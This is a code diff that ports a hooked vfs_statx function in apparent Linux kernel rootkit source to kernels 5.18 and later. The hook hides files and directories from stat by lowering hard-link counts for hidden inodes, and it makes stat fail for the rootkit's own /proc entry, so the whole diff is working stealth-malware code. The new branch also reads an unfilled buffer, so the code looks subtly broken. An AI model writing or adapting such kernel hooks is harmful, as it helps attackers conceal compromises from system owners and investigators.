@@ -1009,8 +1009,13 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
 }
 #endif
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
 static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32);
 static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask) {
+#else
+static long (*real_vfs_statx)(int, struct filename  *, int, struct kstat *, u32);
+static long m_vfs_statx(int dfd, struct filename *filename, int flags, struct kstat *stat, u32 request_mask) {
+#endif
     /** XXX do I need this much */
     char kernbuf[PROCNAME_MAXLEN+6] = {0};
 
@@ -1022,8 +1027,13 @@ static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct 
      *      and update hard-links counter accordingly.
      *  2   make stat fail for /proc interface.
      * */
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
     if (!copy_from_user((void*)kernbuf, filename, sizeof(kernbuf)-1)) {
         if (strlen(kernbuf) > 0 && S_ISDIR(stat->mode)) {
+#else
+        if (strlen(filename->name) > 0 && S_ISDIR(stat->mode)) {
+#endif
             int count = fs_is_dir_inode_hidden((const char *)kernbuf, stat->ino);
             if (count > 0) {
                 prinfo("%s: file match ino=%llu nlink=%d count=%d\n", __func__, stat->ino, stat->nlink, count);
@@ -1031,11 +1041,17 @@ static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct 
                 /* Hit(s) -> decrement hard-link counts */
                 stat->nlink -= count;
             }
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
         } else if (strstr(kernbuf, PROCNAME)) {
+#else
+        } else if (strstr(filename->name, PROCNAME)) {
+#endif
             /* Mauro? */
             rv = -ENOENT;
         }
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
     }
+#endif
     return rv;
 }
 
